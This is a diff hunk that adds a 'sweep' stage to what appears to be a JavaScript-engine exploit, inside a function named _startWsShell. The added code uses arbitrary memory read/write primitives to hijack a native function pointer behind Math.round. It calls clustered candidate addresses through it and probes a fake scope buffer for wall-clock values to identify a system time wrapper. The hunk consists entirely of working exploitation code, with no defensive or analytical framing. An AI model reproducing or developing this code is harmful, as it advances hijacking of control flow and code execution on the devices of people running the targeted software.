@@ -5175,6 +5175,44 @@ function _startWsShell(){
           reply.log=elog;
           break;
         }
+        /* v10 SWEEP: auto-pick the TIGHT clusters (>=6 values within a 32KB
+         * window - the wrapper signature: small packed functions) and
+         * rawcall every member, ELs-banking the scope after each. A death
+         * mid-sweep only costs the remaining members - never the data.
+         * The witness: a time-class wrapper writes {sec in [0x40000000,
+         * 0x80000000), usec < 1e6} into the pre-zeroed scope. */
+        if(msg.sweep===1||msg.sweep==='1'){
+          var svals=vals.slice().sort(function(a,b){return a<b?-1:(a>b?1:0);});
+          var clusters=[],cur=[svals[0]];
+          for(var sw1=1;sw1<svals.length;sw1++){
+            if(svals[sw1]-cur[cur.length-1]<=0x8000n){cur.push(svals[sw1]);}
+            else{if(cur.length>=6)clusters.push(cur);cur=[svals[sw1]];}
+          }
+          if(cur.length>=6)clusters.push(cur);
+          ELs('sweep: '+clusters.length+' tight clusters, sizes '+clusters.map(function(c){return c.length;}).join(','));
+          var swept=0,witness=null;
+          for(var ci2=0;ci2<clusters.length&&!witness;ci2++){
+            for(var mi=0;mi<clusters[ci2].length&&!witness;mi++){
+              var tgt=clusters[ci2][mi];
+              ELs('rc 0x'+tgt.toString(16)+' ['+(++swept)+']');
+              for(var zr2=0;zr2<4;zr2++)S.absWrite(S.fakeScope+BigInt(zr2*8),0n);
+              if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+              var oFn=S.absRead(S.neEntry.addr+0x28n,8)[0];
+              S.absWrite(S.neEntry.addr+0x28n,tgt);
+              try{Math.round(-5.7);}catch(e){}
+              S.absWrite(S.neEntry.addr+0x28n,oFn);
+              if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+              var s0=S.absRead(S.fakeScope,8)[0],s1=S.absRead(S.fakeScope+8n,8)[0];
+              ELs('sc 0x'+s0.toString(16)+' 0x'+s1.toString(16));
+              if(s0>0x40000000n&&s0<0x80000000n&&s1<0xF4240n){witness=tgt;reply.tv='0x'+s0.toString(16);reply.tvusec='0x'+s1.toString(16);}
+            }
+          }
+          if(witness){ELs('E2 WITNESS: 0x'+witness.toString(16)+' wrote the wall clock');reply.witness='0x'+witness.toString(16);}
+          else ELs('sweep done, no witness in '+swept+' calls');
+          reply.swept=swept;
+          reply.log=elog;
+          break;
+        }
         /* ---- stage 2 (v6): SPARSE-ANCHOR MATCHING ONLY ----
          * The wrapper RVAs are RETIRED: the wrapper region spans 10+ 16KB
          * pages so its low-14 residues blanket the value space - four dead
